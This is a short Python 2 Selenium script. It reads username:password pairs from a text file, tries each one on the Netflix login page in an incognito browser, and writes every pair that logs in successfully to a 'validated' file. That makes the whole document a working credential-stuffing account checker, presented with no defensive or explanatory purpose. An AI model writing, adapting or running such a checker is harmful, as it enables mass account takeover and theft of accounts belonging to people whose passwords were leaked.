from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
with open('list.txt', 'r') as v:
    for line in v:
        if ':' in line:
            a, b = line.strip().split(':')
            print a,b
            usernameStr=a
            passwordStr=b
            chrome_options = webdriver.ChromeOptions()
            chrome_options.add_argument("--incognito")
            browser = webdriver.Chrome(chrome_options=chrome_options)
            browser.get(('https://www.netflix.com/in/login'))
            username = browser.find_element_by_id('id_userLoginId')
            username.send_keys(usernameStr)
            pasword = browser.find_element_by_id('id_password')
            pasword.send_keys(passwordStr)
            browser.find_element_by_css_selector(".login-button").click()
            try:
            	error = browser.find_element_by_css_selector(".ui-message-contents")
            except Exception as e:
            	print "log in successful"
            	outfile=open("validated.txt","a")
            	final=""
            	final=usernameStr+' '+passwordStr+'\n'
            	outfile.write(final)
            	outfile.close()
            else:
            	print "Wrong credentials"
            browser.close()